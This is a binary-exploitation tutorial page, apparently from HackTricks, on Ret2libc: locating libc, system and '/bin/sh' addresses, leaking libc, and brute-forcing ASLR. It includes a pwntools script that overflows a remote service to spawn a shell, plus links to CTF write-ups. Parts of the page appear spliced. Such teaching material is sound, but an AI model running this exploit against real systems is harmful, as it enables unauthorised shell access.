_body: "# Ret2lib\n\n{{#include ../../../banners/hacktricks-training.md}}\n\n## **Basic Information**\n\nThe essence of **Ret2Libc**\
  \ is to redirect the execution flow of a vulnerable program to a function within a shared library (e.g., **system**, **execve**,\
  \ **strcpy**) instead of executing attacker-supplied shellcode on the stack. The attacker crafts a payload that modifies\
  \ the return address on the stack to point to the desired library function, while also arranging for any necessary arguments\
  \ to be correctly set up according to the calling convention.\n\n### **Example Steps (simplified)**\n\n- Get the address\
  \ of the function to call (e.g. system) and the command to call (e.g. /bin/sh)\n- Generate a ROP chain to pass the first\
  \ argument pointing to the command string and the execution flow to the function\n\n## Finding the addresses\n\n- Supposing\
  \ that the `libc` used is the one from current machine you can find where it'll be loaded in memory with:\n\n```bash\nldd\
  \ /path/to/executable | grep libc.so.6 #Address (if ASLR, then this change every time)\n```\n\nIf you want to check if the\
  \ ASLR is changing the address of libc you can do:\n\n```bash\nfor i in `seq 0 20`; do ldd ./<bin> | grep libc; done\n```\n\
  \n- Knowing the libc used it's also possible to find the offset to the `system` function with:\n\n```bash\nreadelf -s /lib/i386-linux-gnu/libc.so.6\
  \ | grep system\n```\n\n- Knowing the libc used it's also possible to find the offset to the string `/bin/sh` function with:\n\
  \n```bash\nstrings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh\n```\n\n### Using gdb-peda / GEF\n\nKnowing the\
  \ libc used, It's also possible to use Peda or GEF to get address of **system** function, of **exit** function and of the\
  \ string **`/bin/sh`** :\n\n```bash\np system\np exit\nfind \"/bin/sh\"\n```\n\n### Using /proc/\\<PID>/maps\n\nIf the process\
  \ is creating **children** every time you talk with it (network server) try to **read** that file (probably you will need\
  \ to be root).\n\nHere you can find **exactly where is the libc loaded** inside the process and **where is going to be loaded**\
  \ for every children of the process.\n\n![](<../../../images/image (853).png>)\n\nIn this case it is loaded in **0xb75dc000**\
  \ (This will be the base address of libc)\n\n## Unknown libc\n\nIt might be possible that you **don't know the libc the\
  \ binary is loading** (because it might be located in a server where you don't have any access). In that case you could\
  \ abuse the vulnerability to **leak some addresses and find which libc** library is being used:\n\n\n{{#ref}}\nrop-leaking-libc-address/\n\
  {{#endref}}\n\nAnd you can find a pwntools template for this in:\n\n\n{{#ref}}\nrop-leaking-libc-address/rop-leaking-libc-template.md\n\
  {{#endref}}\n\n### Know libc with 2 offsets\n\nCheck the page [https://libc.blukat.me/](https://libc.blukat.me/) and use\
  \ a **couple of addresses** of functions inside the libc to find out the **version used**.\n\n## Bypassing ASLR in 32 bits\n\
  \nThese brute-forcing attacks are **only useful for 32bit systems**.\n\n- If the exploit is local, you can try to brute-force\
  \ the base address of libc (useful for 32bit systems):\n\n```python\nfor off in range(0xb7000000, 0xb8000000, 0x1000):\n\
  ```\n\n- If attacking a remote server, you could try to **burte-force the address of the `libc` function `usleep`**, passing\
  \ as argument 10 (for example). If at some point the **server takes 10s extra to respond**, you found the address of this\
  \ function.\n\n## One Gadget\n\nExecute a shell just jumping to **one** specific **address** in libc:\n\n\n{{#ref}}\none-gadget.md\n\
  {{#endref}}\n\n## x86 Ret2lib Code Example\n\nIn this example ASLR brute-force is integrated in the code and the vulnerable\
  \ binary is loated in a remote server:\n\n```python\nfrom pwn import *\n\nc = remote('192.168.85.181',20002)\nc.recvline()\n\
  \nfor off in range(0xb7000000, 0xb8000000, 0x1000):\n    p = \"\"\n    p += p32(off + 0x0003cb20) #system\n    p += \"CCCC\"\
  \ #GARBAGE, could be address of exit()\n    p += p32(off + 0x001388da) #/bin/sh\n    payload = 'A'*0x20010 + p\n    c.send(payload)\n\
  \    c.interactive()\n```\n\n## x64 Ret2lib Code Example\n\nCheck the example from:\n\n\n{{#ref}}\n../\n{{#endref}}\n\n\
  ## ARM64 Ret2lib Example\n\nIn the case of ARM64, the ret instruction jumps to whereber the x30 registry is pointing and\
  \ not where the stack registry is pointing. So it's a bit more complicated.\n\nAlso in ARM64 an instruction does what the\
  \ instruction does (it's not possible to jump in the middle of instructions and transform them in new ones).\n\nCheck the\
  \ example from:\n\n{{#ref}}\nret2lib-printf-leak-arm64.md\n{{#endref}}\n\n## Ret-into-printf (or puts)\n\nThis allows to\
  \ **leak information from the process** by calling `printf`/`puts` with some specific data placed as an argument. For example\
  \ putting the address of `puts` in the GOT into an execution of `puts` will **leak the address of `puts` in memory**.\n\n\
  ## Ret2printf\n\nThis basically means abusing a **Ret2lib to transform it into a `printf` format strings vulnerability**\
  \ by using the `ret2lib` to call printf with the values to exploit it (sounds useless but possible):\n\n\n{{#ref}}\n../../format-strings/\n\

  \  - Ret2lib, given a leak to the address of a function in libc, using one gadget\n- [https://guyinatuxedo.github.io/08-bof_dynamic/csawquals17_svc/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/csawquals17_svc/index.html)\n\
  \  - 64 bit, ASLR enabled but no PIE, the first step is to fill an overflow until the byte 0x00 of the canary to then call\
  \ puts and leak it. With the canary a ROP gadget is created to call puts to leak the address of puts from the GOT and the\
  \ a ROP gadget to call `system('/bin/sh')`\n- [https://guyinatuxedo.github.io/08-bof_dynamic/fb19_overfloat/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/fb19_overfloat/index.html)\n\
  \  - 64 bits, ASLR enabled, no canary, stack overflow in main from a child function. ROP gadget to call puts to leak the\
  \ address of puts from the GOT and then call an one gadget.\n- [https://guyinatuxedo.github.io/08-bof_dynamic/hs19_storytime/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/hs19_storytime/index.html)\n\
  \  - 64 bits, no pie, no canary, no relro, nx. Uses write function to leak the address of write (libc) and calls one gadget.\n\

  \  - Uses a format string to leak the canary from the stack and a buffer overflow to calle into system (it's in the GOT)\
  \ with the address of `/bin/sh`.\n- [https://guyinatuxedo.github.io/14-ret_2_system/tu_guestbook/index.html](https://guyinatuxedo.github.io/14-ret_2_system/tu_guestbook/index.html)\n\
  \  - 32 bit, no relro, no canary, nx, pie. Abuse a bad indexing to leak addresses of libc and heap from the stack. Abuse\
  \ the buffer overflow o do a ret2lib calling `system('/bin/sh')` (the heap address is needed to bypass a check).\n\n{{#include\
